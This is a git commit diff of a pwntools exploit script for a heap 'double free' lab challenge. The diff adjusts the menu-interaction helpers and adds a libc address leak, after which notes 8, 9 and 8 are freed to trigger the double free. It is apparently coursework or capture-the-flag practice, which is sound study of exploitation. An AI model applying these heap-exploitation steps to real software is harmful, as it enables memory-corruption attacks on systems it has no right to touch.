412bedf179b9230b00d9104f89ce0dac3ce2e5b3
bernie6401 <bernie6401@gmail.com>
2023-12-06 13:24:03 +0800

    update lab double free exploit

--- PWN/Lab3/lab_double_free/exp.py
+++ PWN/Lab3/lab_double_free/exp.py
@@ -6,34 +6,46 @@ context.arch = 'amd64'
 
 def add_note(idx, len):
     r.recvuntil(b'choice: ')
-    r.sendline(b'1')
+    r.send(b'1')
     r.recvuntil(b'Index: ')
-    r.sendline(str(idx).encode())
+    r.send(str(idx).encode())
     r.recvuntil(b'Length: ')
-    r.sendline(str(len).encode())
+    r.send(str(len).encode())
 
 def read_note(idx):
     r.recvuntil(b'choice: ')
-    r.sendline(b'2')
+    r.send(b'2')
     r.recvuntil(b'Index: ')
-    r.sendline(str(idx).encode())
+    r.send(str(idx).encode())
     r.recvline()
     return r.recvline()
 
 def write_note(idx, content):
     r.recvuntil(b'choice: ')
-    r.sendline(b'3')
+    r.send(b'3')
     r.recvuntil(b'Index: ')
-    r.sendline(str(idx).encode())
+    r.send(str(idx).encode())
     r.recvuntil(b'Content: ')
-    r.sendline(content)
+    r.send(content)
 
 def del_note(idx):
     r.recvuntil(b'choice: ')
-    r.sendline(b'4')
+    r.send(b'4')
     r.recvuntil(b'Index: ')
-    r.sendline(str(idx).encode())
+    r.send(str(idx).encode())
 
+# Leak libc address
+add_note(12, 0x420)
+add_note(13, 0x420)
+add_note(14, 0x420)
+raw_input()
+del_note(12)
+del_note(13)
+raw_input()
+add_note(12, 0x420)
+read_note(12)
+
+raw_input()
 for i in range(1, 0xa):
     add_note(i, 0x10)
 
@@ -41,7 +53,7 @@ for i in range(1, 0x8):
     del_note(i)
 
 
-# raw_input()
+raw_input()
 del_note(8)
 del_note(9)
 del_note(8)
